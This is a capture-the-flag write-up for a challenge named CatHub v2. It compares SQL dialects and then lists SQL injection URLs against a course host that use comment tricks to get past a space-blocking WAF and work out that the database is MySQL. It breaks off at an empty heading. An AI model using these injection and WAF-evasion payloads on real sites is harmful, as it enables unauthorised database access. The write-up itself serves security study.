# CatHub v2 solution step by step

## Step 1. DB syntax comparison

DB Type | LIMIT  | IF     | SLEEP  | OR     | AND    | *      | +      | #      | /**/   | --     |
--------|:------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|
MySQL   |   O    |   O    |   O    | O      |  O     |  O     |  O     | O      |   O    |  O     |
MSSQL   |  TOP   |   O    |  DELAY | O      |  O     |  O     | STRCAT | X      |   O    |  O    |
OracleDB|   ?    |   O    | dbms_lock.sleep(sec) | O      |  O     |  O     |  O     | X      |   X    |  O     |

## Step 2 trial and error to determine DB type

### White space banned (WAF)

`https://edu-ctf.csie.org:10159/video.php?vid=1%20SLEEP(3)` does not work (WAF protection for space characters) --> bad cat!, hence we need to use comment to separate commands. 

### Check function

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/TOP/**/1` --> error!: TOP unusable --> OracleDB(X)

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/DELAY(25)` --> error!: DELAY unusable --> MSSQL(X)
### Check comments where usable ones are # -- /**/ 

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/1=1/**/ljfberwhkfjhwbe`  --> error!: /**/ Usable --> OracleDB(X)

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/1=1#ljfberwhkfjhwbe`  --> no error!: # Usable --> MSSQL(X), PorstgreSQL(X), SQLite(X)

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/1=1--ljfberwhkfjhwbe`  --> no error!: -- Usable

### But is it MySQL or MariaDB?

* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/RELEASE_ALL_LOCKS()` --> bad cat!: WAF prevention and this function is MySQL only.
* `https://edu-ctf.csie.org:10159/video.php?vid=1/**/MEDIAN()` --> error!: MariaDB only function.

# Finally we can determine the DB that Kaibro uses is MySQL 

[Function Differences Between MariaDB 10.4 and MySQL 8.0](https://mariadb.com/kb/en/library/function-differences-between-mariadb-104-and-mysql-80/)

### SQL injection in MySQL

